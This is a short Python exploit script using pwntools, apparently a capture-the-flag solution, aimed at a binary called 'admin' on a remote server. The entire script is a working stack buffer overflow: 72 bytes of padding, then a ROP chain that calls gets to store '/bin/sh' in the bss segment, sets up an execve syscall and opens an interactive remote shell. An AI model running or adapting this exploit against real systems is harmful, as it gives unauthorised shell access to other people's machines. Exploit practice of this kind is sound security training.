#! /usr/bin/env python3
from pwn import *
context.arch='amd64'
io = remote('35.186.153.116', 7002)
elf = ELF('admin')

write_mem = 0x6bb300 #the bss segment. 
pop_rdi =   0x41dc9a #: pop rdi ; ret ;
pop_rax =   0x475757 #: pop rax ; ret ;
pop_rsi =   0x48208c #: pop rsi ; ret ;
pop_rdx =   0x4aeef2 #: pop rdx ; ret ;
syscall =   0x475485 #: syscall ; 
gets = 0x410330 #gets function in binary ;

rop = flat([

	'a'*72, #padding
	pop_rdi, #pop rdi ; ret ;
	write_mem, #write bin sh here
	gets, #return to gets ;
	pop_rdi,
	write_mem, #bin_sh
	pop_rax, #pop rax ; ret ;
	0x3b,
	pop_rsi, #pop rsi ; ret ;
	0x0,
	pop_rdx, #pop rdx ; ret ;
	0x0,
	syscall
])
io.sendline(rop)
io.sendline('/bin/sh')
io.interactive()
